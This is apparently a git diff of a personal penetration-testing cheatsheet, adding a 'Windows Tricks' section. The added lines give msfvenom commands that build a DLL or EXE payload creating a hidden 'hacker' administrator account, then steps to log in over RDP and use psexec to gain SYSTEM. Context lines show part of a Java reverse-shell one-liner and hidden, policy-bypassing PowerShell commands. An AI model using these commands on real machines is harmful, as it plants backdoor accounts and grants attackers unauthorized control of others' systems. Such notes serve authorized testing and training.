@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 14 Oct 2021
+### Last Updated: 21 Oct 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -382,6 +382,15 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```docker exec -it -u 0 '1ef49e37fb8f'  /bin/bash```
 
 #### Windws Tricks
+##### Windows add user 'hacker' with 'admin' privs and become 'nt authority\system' 
+> 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f dll > version.dll
+or
+> 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f exe > malicious.exe
+> 1. then access via RDP if its avialable e.g. xfreerdp /u:hacker /p:'Hacker123$' /v:192.168.71.168:3389
+> 1. Download psexec.exe "PSTools.zip" on windows
+> 1. Start CMD with "Administrator" privs.
+> 1. Run command --> psexec64.exe -sid cmd.exe
+
 ##### Reverse shell in windows
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command dir'
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command ipconfig'
